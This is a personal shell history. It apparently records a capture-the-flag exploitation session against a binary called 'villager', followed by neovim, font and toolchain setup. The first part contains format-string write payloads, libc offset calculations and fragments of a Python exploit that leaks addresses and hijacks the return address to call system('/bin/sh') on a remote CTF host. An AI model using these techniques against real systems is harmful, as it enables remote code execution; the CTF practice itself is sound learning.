echo "AAAA$(python -c "print(\"%x,\"*100)")"
echo "AAAA$(python -c "print(\"%x,\"*100)"+"\\n")"
echo "AAAA$(python -c "print(\"%x,\"*100)"+\"\\n\")"
echo "AAAA, $(python -c "print(\"%x,\"*100)"+\"\\n\")"
echo "AAAA,$(python -c "print(\"%x,\"*100)"+\"\\n\")"
python -c "ord('%')"
python -c "print(ord('%'))"
python -c "print(chr('2c'))"
python -c "print(chr(0x2c))"
python -c "print(chr(0x78))"
echo "AAAA,$(python -c "print(\"%p,\"*100)"+\"\\n\")"
echo $'\xf1\x58\x55\56%13c%7$n'
echo $'\xf1\x58\x55\56'
python -c "print(int(0x565557f0))"
./villager 
nm
nm -D libc.so.6 
nm -D libc.so.6 | grep system
$(python -V)
objdump -d libc.so.6 
objdump -d libc.so.6 | grep __libc_start_main
$(python int(0003fe70 - 0001a470))
$(python -e int(0003fe70 - 0001a470))
python -e "int(0003fe70 - 0001a470)"
python -c "int(0003fe70 - 0001a470)"
python -c "int(0x0003fe70 - 0x0001a470)"
python -c "int(0x0003fe70 - 0x0001a470)" | -
python -c "int(0x0003fe70 - 0x0001a470)" | cat -
python -c "print(int(0x0003fe70 - 0x0001a470))" 
gbd -q -ex 
gdb -q -ex 
gdb -q -ex "1-2"
gdb -q -ex "p/x 0x1"
gdb -q -ex --batch "p/x 0x1"
gdb -q -ex -batch "p/x 0x1"
gdb -q -batch -ex "p/x 0x1"
gdb -q -batch -ex "x 0x1"
gdb -q -batch -ex "p 0x1"
gdb -q -batch -ex "p/d 0x1"
gdb -q -batch -ex "p/d 0x0003fe70 - 0x0001a470"
strings -tx libc.so.6 | grep '/bin/sh/'
strings -tx libc.so.6 | grep '/bin/sh'
gdb -q -batch -ex "p/d 0x1535aa - 0x1a470"
gdb -q ./villager
gdb -q villager
echo -e "\xf1\x58\x55\56\xf2\x58\x55\56\xf3\x58\x55\56\xf4\x58\x55\56%52c%7$n%10c%8$n%239c%9$n%239c%10$n"
echo -e "\xf1\x58\x55\56\xf2\x58\x55\56\xf3\x58\x55\56\xf4\x58\x55\56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n"
echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
echo -e "\x13\x5a\x55\x56"
gdb -batch
gdb -batch -q -ex "p"
gdb -batch -q -ex "p 1 -2"
gdb -batch -q -ex "p/d 0x44-16"
echo $'\xf1\x58\x55\56%13c%7$n'
python
python3
echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n" | ./villager 
echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n"
echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n' | ./villager 
echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
echo $'\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
echo $'\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n' | ./villager 
python3 script.py 
echo -e "\x13\x5a\x55\x56" | ./villager 
echo -e "\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
readelf -x villager 
oj -x villager 
od -x villager 
objdujmp -x villager 
objdump -x villager 
readelf -r villager 
nm -D libc.so.6
locale
/usr/bin/python3
ldd villager 
nm -D libc.so.6 | grep puts
nm -D libc.so.6 | grep printf
gdb ./villager -q
objdump villager 
objdump villager -s
objdump villager -a
objdump -a villager 
objdump -d villager 
objdump -d -M intel villager 
python3 script.py 
checksec
sudo apt install checksec
checksec --file=./villeger
checksec --file=./villager
ldd ./villager 
echo $'\xe0\xe1\xb3\xf7%7$x' | ./villager 
echo $'\xe0\xe1\xb3\xf7%7$p' | ./villager 
nc ctfq.u1tramarine.blue 10023
./villager |\x93\x8b\xff}\x93\x8b\xff~\x93\x8b\xff\x7f\x93\x8b\xff\x84\x93\x8b\xff\x85\x93\x8b\xff\x86\x93\x8b\xff\x87\x93\x8b\xff%80c%7$hhn%142c%8$hhn%189c%9$hhn%60c%10$hhn%179c%11$hhn%139c%12$hhn%152c%13$hhn%42c%14$hhn\n
python3 script2.py 
import struct
import sys
import telnetlib
import time
class Netcat:
def interact(s):
s = socket.create_connection(("ctfq.u1tramarine.blue", 10023))
# nc = Netcat("ctfq.u1tramarine.blue", 10023)
print("%s" % s.recv(1024).decode()) #Welcome
print("%s" % s.recv(1024).decode()) #What's your name?
s.send(b"%91$x\n")
# %91%x f7b30569
recv = s.recv(1024)
print(recv)
libc_main_addr = int(recv[4:].split(b" ")[0].split(b"\n")[0], 16) - 249
print("libc_main_addr: %x" % libc_main_addr)
system_addr = libc_main_addr + 154112
print("system: %x" % system_addr)
binsh_addr = libc_main_addr + 1282362
print("/bin/sh: %x" % binsh_addr)
print("%s" % s.recv(1024).decode()) #What's your name?
s.send(b"%78$x\n")
recv = s.recv(1024)
ret_addr = int(recv[4:].split(b" ")[0].split(b"\n")[0], 16) - 44
print("ret_addr: %x" % ret_addr)
payload = set_payload_adress(ret_addr, 0)
payload += set_payload_adress(ret_addr, 8)
print(payload)
b=[0,0,0,0]
a=[0,0,0,0]
for x in range(4):
print(a)
print(b)
b[3] = ((b[3]-b[2]-1) % 0x100) + 1
b[2] = ((b[2]-b[1]-1) % 0x100) + 1
b[1] = ((b[1]-b[0]-1) % 0x100) + 1
b[0] = ((b[0]-a[3]-1) % 0x100) + 1
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(payload)-1) % 0x100) + 1
index = 7
payload += b"%%%dc%%%d$hhn" % (a[0], index)
payload += b"%%%dc%%%d$hhn" % (a[1], index+1)
payload += b"%%%dc%%%d$hhn" % (a[2], index+2)
payload += b"%%%dc%%%d$hhn" % (a[3], index+3)
payload += b"%%%dc%%%d$hhn" % (b[0], index+4)
payload += b"%%%dc%%%d$hhn" % (b[1], index+5)
payload += b"%%%dc%%%d$hhn" % (b[2], index+6)
payload += b"%%%dc%%%d$hhn" % (b[3], index+7)
payload += b"\n"
print(payload)
s.send(payload)
time.sleep(0.1)
interact(s)
python3 script2.py 
echo $'\x9cE\x83\xff\x9dE\x83\xff\x9eE\x83\xff\x9fE\x83\xff\xa4E\x83\xff\xa5E\x83\xff\xa6E\x83\xff\xa7E\x83\xff%192c%7$hhn%215c%8$hhn%234c%9$hhn%86c%10$hhn%35c%11$hhn%213c%12$hhn%195c%13$hhn%69c%14$hhn\n'
nm -D libc.so.6 | grep printf
nm _D libc.so.6 | grep __libc_start_main
./villager 
objdump -d -M intel villager 
gdb vllager -q
gdb villager -q
python3 script.py
python3 local.py 
echo $'\xac\xce\xff\xff\xad\xce\xff\xff\xae\xce\xff\xff\xaf\xce\xff\xff\xb4\xce\xff\xff\xb5\xce\xff\xff\xb6\xce\xff\xff\xb7\xce\xff\xff%192c%7$hhn%55c%8$hhn%154c%9$hhn%70c%10$hhn%35c%11$hhn%53c%12$hhn%115c%13$hhn%53c%14$hhn\n'
gdb villager
gdb ./villager 
python3 pwn.py 
echo $PATH
code ~/.bashrc
. ~/.bashrc
echo $PATH
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
sudo apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
pip install "git+https://github.com/Gallopsled/pwntools#egg=pwntools"
python3 pwn.py 
python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev3
pip install pwntools
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
gdb
sudo apt install python-dev
sudo apt install software-properties-common
sudo apt add
apt-add-repository ppa:pwntools/binutils
sudo apt-add-repository ppa:pwntools/binutils
apt update
sudo apt update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
pip install pwntools
export PATH="$PATH:~/.local/bin"
echo $PATH
pip list
pip list | grep pwn
pip3 list
python3 -c "from pwn import *"
python3 -c "from pwn import * p = process()"
p
python3 pwn.py 
pwnlib
python3
python2.7 -m pip install --upgrade pyelftools==0.24
sudo python2.7 -m pip install --upgrade pyelftools==0.24
sudo apt-get install software-properties-common
sudo apt-add-repository ppa:pwntools/binutils
apt-get install binutils-$ARCH-linux-gnu
sudo apt-get install binutils-$ARCH-linux-gnu
python3
python3 a.py 
which python3
python
python3
where python3
which python3
code ~/.config/flake8
. ~/.config/flake8
ls ~/
ls ~/ -a
ls ~/.config/ -a
flake8 --config
flake8 --config ~/.config/flake8 
cd momotech/
sudo sysctl -w kernel.randomize_va_space=2
echo -e "\x04\x00\x00\x00AAAA" | ./a.out
git clone https://github.com/0vercl0k/rp.git
cd momotech/rp/
cd src/build/
chmod u+x ./build-release.sh && ./build-release.sh
sudo apt install cmake
chmod u+x ./build-release.sh && ./build-release.sh
cd ..
cd bu
cd build/
sudo apt install ninja-build
chmod u+x ./build-release.sh && ./build-release.sh
rp++
./rp-lin-x86_64 --file=a.out
ls ~/ -a
ls ~/bin -a
mkdir ~/bin
wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O $HOME/bin/rp
rp++
/rp-lin-x64
rp-lin-x64
ls ~/bin/
ls ~/bin/rp 
ls ~/bin/rp -a
rp
cat ~/bin/rp
~/bin/rp 
sudo ~/bin/rp 
chmod +x ~/bin/rp 
rp
~/bin/rp
rp++
mv ~/bin/rp /usr/local/bin/
sudo mv ~/bin/rp /usr/local/bin/
rp
mv /usr/local/bin/rp /usr/local/bin/rp-lin-x64
sudo mv /usr/local/bin/rp /usr/local/bin/rp-lin-x64
rp-lin-x64 
wget https://github.com/0vercl0k/rp/releases/download/v1/rp-lin-x64
ls
./rp_lin-x64
rm rp-lin-x64 
sudo mv /usr/local/bin/rp /usr/local/bin/rp++
sudo mv /usr/local/bin/rp-lin-x64 /usr/local/bin/rp++
rp++
sudo mv /usr/local/bin/rp++ /usr/local/bin/rp-lin-x64
rp-lin-x64 --file=a.out --rop=3 --unique 
cd ksnctf/23/momotech/
rp-lin-x64 --file=a.out --rop=3 --unique 
rp-lin-x64 --file=a.out --rop=3 --unique > gadgets.txt
objdump -d -j.plt a.out
cd momotech/
objdump -d -j.plt a.out
objdump -d  a.out
objdump -d -M intel  a.out
cd momotech/
gdb a
cd momotech/
readrelf -a a.out 
readelf -a a.out 
col
man col
rp-lin-x64 --file=a.out --rop=3 --unique |col -bx
cd momotech/
rp-lin-x64 --file=a.out --rop=3 --unique |col -bx
rp-lin-x64 --file=a.out --rop=3 --unique | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
code ~/.bashrc 
. ~/.bashrc 
color_strip 
rp-lin-x64 --file=a.out --rop=3 --unique | color_strip 
rp-lin-x64 --file=a.out --rop=3 --unique | color_strip > gadgets.txt 
rp-lin-x64 --file=./a.out --rop=3 --unique | color_strip > gadgets.txt 
wget https://github.com/0vercl0k/rp/releases/download/v1/rp-lin-x86 && chmod +x rp-lin-x86 && rp-lin-x86 /usr/local/bin
mv rp-lin-x86 /usr/local/bin
sudo mv rp-lin-x86 /usr/local/bin
rp-lin-x86 --file=./a.out --rop=3 --unique | color_strip > gadgets.txt 
gcc -fno-stack-protector -m32 bof.c
file a.out 
file ./a.out 
gcc -fno-stack-protector -m32 bof.c
sudo apt-get install libc6-dev-i386 
gcc -fno-stack-protector -m32 bof.c
file ./a.out 
rp-lin-x86 --file=./a.out --rop=3 --unique | color_strip > gadgets.txt 
./a.out 
cho -e "\x04\x00\x00\x00AAAA" | ./a.out
echo -e "\x04\x00\x00\x00AAAA" | ./a.out
echo -e "\x04\x00\x00\x00AAAAA" | ./a.out
objdump -s ./villager 
objdump -d -D ./villager 
objdump -dBfh ./villager 
objdump -DSfh ./villager 
./villager 
rp-lin-x86 --file=villager 
rp-lin-x86 --file=villager --rop --unique
rp-lin-x86 --file=villager --rop=3 --unique
rp-lin-x86 --file=villager --rop=3 --unique | color_strip > gadgets.txt
python3 exploit3.py 
readelf -a ./villager 
oj ./villager 
od ./villager 
gcc -nostdlib test.s 
gcc -nostdlib -m32 test.s 
objdump -d a.out 
gcc -nostdlib -m32 test.s 
objdump -d a.out 
gcc -nostdlib -m32 test.s 
objdump -d a.out 
file a.out
file ./villager 
objdump -d ./villager 
objdump -d -j.got
objdump -d -M intel ./villager 
objdump -S ./villager 
readelf -S villager 
objdump -s -j.got.plt ./villager 
objdump -s ./villager 
objdump -d ./villager 
python3 exploit3.py 
objdump -d ./villager 
readelf -r villager 
readelf -a villager 
nm -D libc.so.6 | grep __libc_start_main
nm -D libc.so.6 | grep __lib
nm -D libc.so.6 | grep __libc_main
readelf -s libc.so.6 | grep __libc
readelf -s libc.so.6 | grep __libc_star
readelf -s libc.so.6 | grep __libc_start_main
objdump -d -j.got villager 
readelf -r got
readelf -r 
readelf -r villager 
nm -D libc.so.6 | grep __libc_start_main
objdump -d villager 
readelf -l villager 
readelf -d villager 
readelf -r villager 
man readelf
objdump -d villager | sed -n '/<main>:/,/^$/p'
readelf -S villager 
readelf -S --help
readelf -t --help
readelf -t 
readelf -t villager 
readelf -tW villager 
readelf --section=.gotvillager 
objdump --section=.gotvillager 
objdump --section=.got villager 
objdump --section=".got" villager 
objdump -f".got" villager 
objdump -j".got" villager 
objdump -j villager 
objdump -d -j villager 
objdump -d --secion=.plt villager 
objdump -d --section=.plt villager 
objdump -d --section=.got villager 
objdump -d --section=.got.plt villager 
readelf -S villager 
readelf -S -j.got villager 
readelf -S --sections=.got villager 
readelf -S -t villager 
./villager 
echo $'\x5655efa6'
echo $'\xa6\x5e\x55\x56'
echo $'\xa6\x5e\x55\x56%7$s'
nm -D libc.so.6 | grep printf
readelf -j.got
readelf -d -j.got
readelf -d -j.got ./villager
readelf -d ./villager
readelf -t ./villager
readelf -r ./villager
objdump --section-headers villager | grep text
objdump --section-headers villager
echo $'\xd0\x8fbV\xe0M\xa1\xf7\x80P\xa6\xf70\x9d\xa4\'

echo $'\xd0\x8fbV\xe0M\xa1\xf7\x80P\xa6\xf70\x9d\xa4\'
echo $'\xd0\x8fbV\xe0M\xa1\xf7\x80P\xa6\xf70\x9d\xa4'
python3 exploit3.py 
objdump -S ./villager 
python3 exploit3.py 
file ./villager 
python3 exploit3.py 
file ./villager 
python3 exploit3.py 
./vi
./villager 
nm -D libc.so.6 | grep system
nm -D libc.so.6 | grep /bin/sh
strings libc.so.6 | grep "sh"
strings libc.so.6 | grep "sh$"
strings -a -tx libc.so.6 | grep "sh$"
strings -tx libc.so.6 | grep "sh$"
strings -tx libc.so.6 | grep "/bin/sh"
objdump -s ./villager 
objdump -d a.out | sed -n '/<main>:/,/^$/p'
objdump -d ./villager | sed -n '/<main>:/,/^$/p'
kldstat
objdump -d ./villager 
objdump -S ./villager 
python
python3
ssh hamilton
/usr/bin/python3
nm -D libc.so.6 | grep printf
nm -D libc.so.6 | grep beep
objdump -d villager 
objdump -x villager 
cd ksnctf/23/
python3 exploit4.py 
sudo vim /etc/sysctl.d/10-ptrace.conf
sudo strace -fp $PID
sudo strace -f -p $PID
sudo strace -h
sudo strace -f -p $PID
strace -f -p $PID
strace -p $PID
cd ./ksnctf/23/
python3 exploit4.py 
cd ./ksnctf/23/
sudo python3 exploit4.py 
python3 exploit4.py 
sudo sysctl -w kernel.yama.ptrace_scope=0
python3 exploit4.py 
echo 0 > /proc/sys/kernel/yama/ptrace_scope
sudo echo 0 > /proc/sys/kernel/yama/ptrace_scope
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
strace
strace -p
strace -p $PID
strace -p $'PID'
strace -p "$PID"
strace -p $PID
echo $PID
cat /etc/sysctl.d/10-ptrace.conf
code /etc/sysctl.d/10-ptrace.conf
cd ksnctf/23/
python3 exploit4.py 
python3 exploit4.py DEBUG
gbd -p $(pgrep 9075)
gdb -p $(pgrep 9075)
gdb -p "$(pgrep 9075)"
python3 exploit4.py
cd ksnctf/23/
python3 exploit4.py
objdump -Fd
objdump -Fd villager 
$ wget http://nixos.org/releases/patchelf/patchelf-0.8/patchelf-0.8.tar.bz2
$ tar xfa patchelf-0.8.tar.bz2
$ wget http://nixos.org/releases/patchelf/patchelf-0.8/patchelf-0.8.tar.bz2
$ tar xfa patchelf-0.8.tar.bz2
wget  http://nixos.org/releases/patchelf/patchelf-0.8/patchelf-0.8.tar.bz2
tar xfa patchelf-0.8.tar.bz2
cd patchelf-0.8
./configure --prefix=/usr/local
make
sudo make install
/usr/local/bin/patchelf 
nm -D libc.so.6 | grep __libc_start_main
nm -D libc.so.6 | system
nm -D libc.so.6 | grep system
nm -D ./libc.so.6 | grep system
LD_TRACE_LOADED_OBJECTS=1 villager
ldd villager 
elfdump -d villager 
objdump -d villager 
objdump -x villager 
python3
cd ksnctf/23/
python3 exploit4.py
python3 exploit
python3 exploit3.py 
python3 exploit4.py 
python3 exploit4.py DEBUG
python3 exploit4.py
python3 exploit4.py 
gdb villager
ls -l
chmod +x rightsout.exe 
./rightsout.exe 
file rightsout.exe 
objdump -d rightsout.exe
strings rightsout.exe
make.bat
./make.bat
echo $PATH
/mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/bin/lcc  -Wa-l -Wl-m -Wl-j -o gazou.gb gazou.c
/mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/bin/lcc.exe  -Wa-l -Wl-m -Wl-j -o gazou.gb gazou.c
./make.bat 
./make_map.sh 
echo $PATH
export PATH=$PATH:/mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/include
./make.bat 
lcc
lcc.exe
echo $PATH
ls /mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/bin -l
lcc
lcc.exe -Wl-yo2 -o gazou.gb gazou.c
./make.bat 
nvim
vim
nvim
apt search node
apt list nodejs
jobs
apt update
sudo apt update
sudo apt install nodejs
nodejs -v
sudo apt install npm
nvim -v
fg
vim $MYVIMRC
nvim
cd ~/.config/nvim/
ls
rm -r dein.vim/
rm -rf dein.vim/
ls
cd ~/.vim/
ls
touch dein_lazy.toml
nvim
% curl https://raw.githubusercontent.com/Shougo/dein.vim/master/bin/installer.sh > installer.sh
% curl https://raw.githubusercontent.com/Shougo/dein.vim/master/bin/installer.sh > installer.sh
curl https://raw.githubusercontent.com/Shougo/dein.vim/master/bin/installer.sh > installer.sh
sh ./installer.sh ~/.cache/dein
rm -r ~/.cache/dein/
rm -rf ~/.cache/dein/
sh ./installer.sh ~/.cache/dein
nvim ~/.config/nvim/init.vim 
sudo apt install vim
vim -v
nvim ~/.config/nvim/init.vim 
mv ~/.vim/dein_lazy.toml ~/.config/nvim/
mv ~/.vim/dein.toml ~/.config/nvim/
ls ~/.vim -a
fg
ls ~/.vim -a
ls ~/.vim/settings/ -a
mv ~/.vim/settings/coc-setting.vim ~/.config/nvim/plugins/
ls ~/.config/nvim/plugins/
mv ~/.config/nvim/plugins/coc-setting.vim ~/.config/nvim/plugins/coc.vim
ls ~/.config/nvim/plugins/
fg
nvim
apt list yarn
apt install list yarn
sudo apt install list yarn
sudo apt search yarn
node -v
nvim
sudo apt install -y nodejs npm
sudo npm intall -g n
sudo npm install -g n
sudo n lts
sudo apt purge -y nodejs npm
sudo apt autoremove -y
node -v
sudo npm install -g yarn
yarn --vesion
n
jobs
man jobs
kill %1
jobs
kill %1
jobs
jobs -l
kill 6866
jobs
nvim
nvim ~/.config/nvim/dein.toml 
nvim
nvim -v
apt list 
apt list neovim
sudo apt remove neovim -y
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:neovim-ppa/stable
nvim -v
sudo add-apt-repository ppa:neovim-ppa/stable
le.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
sudo apt-get update
sudo apt-get install neovim
nvim
nvim -v
nvim
ls ~/.config/nvim/plugins/coc.vim 
nvim 
ls ~/.config/nvim/plugins/coc.vim -l
nvim
sudo apt install -y snapd
sudo snap install ccls --classic
snap
sudo apt install clang
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release     -DCMAKE_PREFIX_PATH=/usr/lib/llvm-10     -DLLVM_INCLUDE_DIR=/usr/lib/llvm-10/include     -DLLVM_BUILD_INCLUDE_DIR=/usr/include/llvm-10/
cmake
nvim
sudo apt install clangd
clangd -v
clangd --version
pip install compiledb
copiledb make
compiledb make
nvim /mnt/c/Users/takumi/gameboy/picture/animation_360tiles/gazou.c 
nvim ~/.config/nvim/init.vim 
nvim
sudo apt-get install clangd-12
sudo update-alternatives --install /usr/bin/clangd clangd /usr/bin/clangd-12 100
clangd --version
fg
nvim
nvim 
pyenv install 3.9.7
curl https://pyenv.run | bash
cat < 'EOF ' >> ./.bashrc
cat < 'EOF ' >> ~/.bashrc
cat < 'EOF' >> ~/.bashrc
cat << 'EOF' >> ~/.bashrc
export PYENV_ROOT="$HOME/.pyenv"
command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init -)"
EOF

exec "$SHELL"
pyenv
pyenv install 3.9.7
pyenv virtualenv
pyenv virtualenv -h
pyenv virtualenv 3.9.7 neovim
pyenv virtualenv 3.9.7 neovim3
pip install jedi-lauguage-server
pip install jedi-language-server
nvim
ls
nvmi
nvim
git clone --depth=1 --recursive https://github.com/MaskRay/ccls
cd ccls
# Download "Pre-Built Binaries" from https://releases.llvm.org/download.html
# and unpack to /path/to/clang+llvm-xxx.
# Do not unpack to a temporary directory, as the clang resource directory is hard-coded
# into ccls at compile time!
# See https://github.com/MaskRay/ccls/wiki/FAQ#verify-the-clang-resource-directory-is-correct
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release -DCMAKE_PREFIX_PATH=/path/to/clang+llvm-xxx
cmake --build Releasecmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release     -DCMAKE_PREFIX_PATH=/usr/lib/llvm-7     -DLLVM_INCLUDE_DIR=/usr/lib/llvm-7/include \
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release     -DCMAKE_PREFIX_PATH=/usr/lib/llvm-7     -DLLVM_INCLUDE_DIR=/usr/lib/llvm-7/include     -DLLVM_BUILD_INCLUDE_DIR=/usr/include/llvm-7/
sudo apt install zlib1g-dev libncurses-dev
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release -DCMAKE_PREFIX_PATH=/path/to/clang+llvm-xxx
cd ccls
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release -DCMAKE_PREFIX_PATH=/path/to/clang+llvm-xxx
sudo apt install clang libclang-dev
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release     -DCMAKE_PREFIX_PATH=/usr/lib/llvm-7     -DLLVM_INCLUDE_DIR=/usr/lib/llvm-7/include     -DLLVM_BUILD_INCLUDE_DIR=/usr/include/llvm-7/
cmake --build Release
fg
nvim
clang
clangd
echo $PATH | grep clang
echo $PATH
which clangd
export PATH=$PATH:/usr/bin/clangd
echo $PATH
export PATH=$PATH:/usr/bin/clangd
echo $PATH
echo $PATH | grep clang
ls /usr/bin/clang -d
ls /usr/bin/clang -l
ls /usr/bin/clangd -l
ls /usr/lib/llvm-10/bin/
nvim
ccls
sudo apt install ccls
ccls
fg
cd ~/.config/coc/extensions/node_modules/coc-ccls/
ls
cat README.md 
yarn install --frozen-lockfile
ln -s node_modules/ws/lib lib
yarn install --frozen-lockfile
ls
cd lib/
ls
cd ..
npm i
npm run build
fg
nvim
cd ~/.cache/dein/repos/github.com/Shougo/dein.vim/
git pull origin master
nvim
cd ~
nvim
sudo apt install clangd-12 build-essential cmake
which clangd-12
ls /usr/bin/clangd-12
ls /usr/bin/clangd-12 -l
ls /usr/lib/llvm-12/bin/cland -l
ls /usr/lib/llvm-12/bin/clangd -l
/usr/lib/llvm-12/bin/clangd
nvim
fg
nvim
nim
nvim
ls ~/.vim/
ls ~/.vim/ -la
ls ~/.vim/settings/
ls ~/.vim/settings/ -la
find coc-settings.json
nvim
fg
nvim
$ git clone https://github.com/powerline/fonts.git --depth=1
$ cd fonts
$ ./install.sh
Copying fonts...
Powerline fonts installed to /Users/user/Library/Fonts
$ cd ..
git clone https://github.com/powerline/fonts.git --depth=1
./install.sh
cd ..
nvim
vim ~/.config/nvim/plugins/vim-airline.vim 
vim
nvim
sudo apt install fonts-powerline
nvim
echo -e "Powerline glyphs:\n\
Code points Glyphe  Description                Old code point
U+E0A0      \xee\x82\xa0       Version control branch     (U+2B60 \xe2\xad\xa0 )\n\
U+E0A1      \xee\x82\xa1       LN (line) symbol           (U+2B61 \xe2\xad\xa1 )\n\
U+E0A2      \xee\x82\xa2       Closed padlock             (U+2B64 \xe2\xad\xa4 )\n\
U+E0B0      \xee\x82\xb0       Rightwards black arrowhead (U+2B80 \xe2\xae\x80 )\n\
U+E0B1      \xee\x82\xb1       Rightwards arrowhead       (U+2B81 \xe2\xae\x81 )\n\
U+E0B2      \xee\x82\xb2       Leftwards black arrowhead  (U+2B82 \xe2\xae\x82 )\n\
U+E0B3      \xee\x82\xb3       Leftwards arrowhead        (U+2B83 \xe2\xae\x83 )\n\
"
echo -e "Powerline glyphs:\n\
Code points Glyphe  Description                Old code point
U+E0A0      \xee\x82\xa0       Version control branch     (U+2B60 \xe2\xad\xa0 )\n\
U+E0A1      \xee\x82\xa1       LN (line) symbol           (U+2B61 \xe2\xad\xa1 )\n\
U+E0A2      \xee\x82\xa2       Closed padlock             (U+2B64 \xe2\xad\xa4 )\n\
U+E0B0      \xee\x82\xb0       Rightwards black arrowhead (U+2B80 \xe2\xae\x80 )\n\
U+E0B1      \xee\x82\xb1       Rightwards arrowhead       (U+2B81 \xe2\xae\x81 )\n\
U+E0B2      \xee\x82\xb2       Leftwards black arrowhead  (U+2B82 \xe2\xae\x82 )\n\
U+E0B3      \xee\x82\xb3       Leftwards arrowhead        (U+2B83 \xe2\xae\x83 )\n\
"
fc-match
nvim
vim ~/.config/nvim/plugins/vim-airline.vim 
:nvim
nvim
vim ~/.config/nvim/plugins/vim-airline.vim 
fontconfig
fc-list
fc-list | grep power
fc-list | grep Power
echo -e "Powerline glyphs:\n\
Code points Glyphe  Description                Old code point
U+E0A0      \xee\x82\xa0       Version control branch     (U+2B60 \xe2\xad\xa0 )\n\
U+E0A1      \xee\x82\xa1       LN (line) symbol           (U+2B61 \xe2\xad\xa1 )\n\
U+E0A2      \xee\x82\xa2       Closed padlock             (U+2B64 \xe2\xad\xa4 )\n\
U+E0B0      \xee\x82\xb0       Rightwards black arrowhead (U+2B80 \xe2\xae\x80 )\n\
U+E0B1      \xee\x82\xb1       Rightwards arrowhead       (U+2B81 \xe2\xae\x81 )\n\
U+E0B2      \xee\x82\xb2       Leftwards black arrowhead  (U+2B82 \xe2\xae\x82 )\n\
U+E0B3      \xee\x82\xb3       Leftwards arrowhead        (U+2B83 \xe2\xae\x83 )\n\
vim ~/.config/nvim/option.vim 
nvim
vim ~/.config/nvim/option.vim 
fc-match
fc-cache -fv
fc-match
fc-match sans-serif
fc-match Powerline
fc-match "Powerline"
fc-match "PowerLine"
ls ~/.config/fontconfig/
cat ~/.config/fontconfig/fonts.conf 
fc-list
fc-list | grep Dvu
cat /etc/fonts/fonts.conf 
cat /etc/fonts/local.conf 
vim ~/.bashrc
so ~/.bashrc 
sudo apt-get install powerline powerline-fonts
sudo apt insatll powerline powerline-fonts
sudo apt install powerline powerline-fonts
sudo apt install 
. ~/.bashrc 
sudo apt update
sudo apt powerline-fonts
sudo apt install powerline-fonts
sudo apt-get install fonts-powerline
vvim ~/.config/fontconfig/conf.d
vvi ~/.config/fontconfig/conf.d
vvim ~/.config/fontconfig/conf.d
vim ~/.config/fontconfig/conf.d
fc-cache -vf
cd ~/.config/fontconfig/
ls
cat fonts.conf 
rm conf.d 
rm fonts.conf 
mkdir conf.d
cd conf.d/
vim 50-enable-terminess-powerline.conf
ls
fc-cache -vf
man fc-chace
fc-chace -help
man fc-cache
man fc-cache -y .
fc-cache -y .
ls
pwd
fc-list : file
fc-list : file | config
fc-list : file | grep config
cd /etc/fonts/
ls
cat local.conf 
rm local.conf 
fc-cache -vf
fc-chace
fc-cache -vf
vim ~/.bashrc 
. ~/.bashrc
echo $XDG_CONFIG_HOME 
fc-cache
fc-cache -fv
fc-match
XDG_CONFIG_HOME=$HOME/.config
nvim
sudo apt intall fonts-powerline
sudo apt install fonts-powerline
wget https://github.com/powerline/powerline/raw/develop/font/PowerlineSymbols.otf
